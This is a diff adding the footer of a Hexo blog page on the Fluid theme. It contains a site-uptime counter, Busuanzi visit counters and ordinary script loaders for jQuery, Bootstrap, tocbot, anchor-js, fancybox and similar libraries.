+    <span id="times">载入时分秒...</span>
+    <script>
+      function createtime() {
+          var now = new Date();
+          var grt = new Date("08/07/2025 00:00:00");
+          var diff = now - grt;
+
+          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
+          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
+          var minutes = Math.floor((diff / 1000 / 60) % 60);
+          var seconds = Math.floor((diff / 1000) % 60);
+
+          if(hours<10) hours="0"+hours;
+          if(minutes<10) minutes="0"+minutes;
+          if(seconds<10) seconds="0"+seconds;
+
+          document.getElementById("timeDate").innerHTML = days + " 天";
+          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
+      }
+      setInterval(createtime, 1000);
+      createtime();
+    </script>
+  </div>
+
+  <!-- 自定义内容 -->
+  
+    <div style="margin-bottom:10px; font-size:13px; color:#666;">
+      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+
+
+  <!-- PV/UV 统计（Busuanzi） -->
+  
+    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
+      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
+      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
+    </div>
+    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+  
+
+
+</div>
+
+<script src="/js/summon-plane.js"></script>
+
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
